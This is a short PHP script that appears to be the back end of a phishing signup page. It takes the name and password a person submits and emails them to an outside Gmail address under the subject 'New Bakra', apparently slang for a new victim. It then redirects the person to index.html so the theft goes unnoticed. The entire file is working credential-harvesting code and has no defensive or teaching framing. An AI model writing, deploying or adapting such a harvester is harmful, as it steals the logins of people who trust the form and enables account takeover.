<?php
$name = $_POST['name'];
$visitor_email = $_POST['password'];

$email_from = 'creationav.github.io/signup/';

$email_subject = 'New Bakra';

$email_body = "User Name: $name.\n".
              "User Email: $visitor_email.\n";

$to = 'lovekingav10@gmail.com';

$headers = "From: $email_from \r\n";

$headers .= "Reply-To: $visitor_email \r\n";


mail($to,$email_subject,$email_body,$headers);

header("Location: index.html");

?>